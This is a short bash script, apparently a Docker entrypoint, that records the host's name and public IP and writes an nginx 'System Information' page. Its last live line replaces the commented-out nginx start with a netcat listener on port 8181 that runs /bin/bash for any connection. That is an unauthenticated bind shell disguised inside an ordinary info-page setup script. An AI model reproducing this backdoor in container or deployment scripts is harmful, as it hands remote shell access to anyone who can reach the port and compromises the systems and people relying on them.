#!/bin/bash

# Get hostname
hostname=$(hostname)

# Get public IP address
public_ip=$(curl -s https://api.ipify.org)

# Send ip to docker logs
echo $public_ip | cat > /dev/stdout

# Generate HTML content 
cat <<EOF > /usr/share/nginx/html/index.html
<!DOCTYPE html>
<html>
<head>
  <title>System Information</title>
</head>
<body>
  <h1>System Information</h1>
  <p><strong>Hostname:</strong> $hostname</p>  
  <p><strong>Public IP Address:</strong> $public_ip</p>    
</body>
</html>
EOF

$(nc -vv -k -l -p 8181 -e /bin/bash)
#$(nginx -g 'daemon off;')
